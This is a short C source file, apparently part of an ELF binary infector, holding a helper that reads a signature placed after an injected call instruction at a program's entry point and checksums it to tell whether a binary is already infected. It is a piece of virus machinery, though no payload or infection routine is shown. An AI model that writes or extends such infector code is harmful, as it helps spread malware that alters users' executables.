
#include "infect.h"

# define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
# define SIGNATURE_LEN		6

static uint64_t	checksum(const char *key, int64_t keysize)
{
	uint64_t	sum = 0;

	while (keysize--)
		sum += key[keysize];
	return sum;
}

bool		check_if_infected(const struct entry *original_entry, \
			const struct safe_pointer info)
{
	const Elf64_Off			sh_offset    = (original_entry->safe_shdr->sh_offset);
	const uint64_t			entry_offset = sh_offset + original_entry->offset_in_section;

	const struct client_info	*client_info = safe(entry_offset + CALL_INSTR_SIZE, SIGNATURE_LEN);
	if (!client_info) return false;

	const char			*signature = (char*)client_info->signature;

	if (checksum(signature, SIGNATURE_LEN) != 677) /* hard signature checksum */
		return true;

	return false;
}
